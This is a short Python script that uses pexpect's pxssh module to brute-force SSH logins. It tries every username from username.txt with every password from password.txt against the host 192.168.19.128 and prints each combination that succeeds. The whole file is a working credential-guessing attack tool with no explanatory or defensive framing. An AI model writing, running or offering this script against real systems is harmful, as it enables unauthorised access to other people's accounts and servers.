from pexpect import pxssh
def Login(server,username,password):
    try:
        s = pxssh.pxssh()
        s.login(server,username,password)
        result = "username is %s,password is %s"%(username,password)
        print(result)
    except:
        print("no")
def main():
    with open("username.txt",'r') as names:
        for username in names:
            with open("password.txt", 'r') as psd:
                for password in psd:
                    Login("192.168.19.128", username, password)
    pass
if __name__ == '__main__':
    main()